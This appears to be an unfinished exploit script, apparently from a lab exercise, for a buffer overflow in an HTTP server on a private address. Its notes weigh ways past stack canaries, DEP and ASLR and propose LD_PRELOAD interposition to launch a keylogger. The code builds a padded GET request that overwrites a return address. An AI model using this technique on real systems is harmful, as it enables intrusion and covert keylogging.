'''
[FINDINGS]
1 Fork process on server and brute force test possible values for the stack canary to find the stack cookie X Can't run shell code DEP or ROPChain due to ASLR (can't leak it too)
2 Leak the stack canary from the stack and just use that X ServerData private
3 Heap spray X DEP and heap is not executable
4 ELF .dynamic section function interposition,
  Write our own functions to override existing functions, this allows our versions of the functions to be used instead of those in the standard libraries.
  Specify a shared library to be loaded before all others using the LD_PRELOAD environment variable 
  After that when the program calls a function, the dynamic linker resolves it to our wrapper instead of the original function.
  So for example we can override the malloc function to run the keylog binary which is included in the shared library
  But how to get the shared library on the server and set the LD_PRELOAD environment variable?

[EXPLOIT SUMMARY]

'''

from keystone import *
from pwn import *
from struct import pack

### CONFIGS ###
host = "192.168.152.130"
port = 8080 
og_handle_address = 0x3720
return_address_offset = 183
log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer

### FUNCTIONS ###


### PAYLOAD ###
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)

### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
crash += b"q" * padding_size # add padding
crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
crash += b"\r\n\r\n"


### PERFORM ATTACK ###

